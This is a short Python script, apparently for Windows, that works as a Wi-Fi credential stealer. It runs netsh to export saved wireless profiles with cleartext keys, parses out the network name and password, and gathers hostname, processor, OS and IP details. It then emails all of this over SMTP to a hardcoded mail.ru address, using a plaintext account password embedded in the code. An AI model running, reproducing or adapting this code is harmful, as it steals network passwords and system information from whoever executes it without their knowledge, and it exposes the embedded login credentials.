import subprocess as sp 
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from time import sleep
from xml.dom import minidom
import requests
import platform as pf 
import socket
 
sp.call( 'netsh wlan show  profile', shell = True )
sp.call( 'netsh wlan export profile folder=C:\\ key =clear', shell = True )
 
sleep( 2 )
 
global doc
 
doc = minidom.parse( 'C:/Беспроводная сеть-Xiaomi_5E64.xml' )
 
def info_pc():
    network_name_pc = pf.node()
    processor_pc = pf.processor()
    system_name_pc = pf.system() + ' ' + pf.release()
    ip_pc = socket.gethostbyname( socket.gethostname() )
 
    global all_info_pc
    all_info_pc = f"Сетевое имя ПК : { network_name_pc }\nПроцессор : { processor_pc }\nСистема : { system_name_pc }\nIP ПК : { ip_pc }\n"
 
def get_ip():
    response = requests.get( 'http://myip.dnsomatic.com' )
    ip = response.text
 
    global answer_ip
    answer_ip =  f"IP address : { ip }"
 
def wifi():
    items_name = doc.getElementsByTagName( 'name' )
    items_password = doc.getElementsByTagName( 'keyMaterial' )
 
    global geted_data
    geted_data = f'Wi-Fi name : { items_name[ 0 ].firstChild.data } \n Wi-Fi password : { items_password[ 0 ].firstChild.data }\n'
 
def all_info():
    global info_user
    info_user = f'{ all_info_pc }\n{ geted_data }\n{ answer_ip }'
 
def send_mail():
    msg = MIMEMultipart()
 
    msg[ 'Subject' ] = 'Wi-Fi data'
    msg[ 'From' ] = 'mr.kulikovandrey@mail.ru'
    body = info_user
    msg.attach( MIMEText( body, 'plain' ) )
 
    server = smtplib.SMTP_SSL( 'smtp.mail.ru', 465 )
    server.login( 'mr.kulikovandrey@mail.ru', 'Nagornaya1.' )
    server.sendmail( 'mr.kulikovandrey@mail.ru', 'mr.kulikovandrey@mail.ru', msg.as_string() )
    server.quit()
 
def main():
    info_pc()
    wifi()
    get_ip()
    all_info()
    send_mail()
 
main()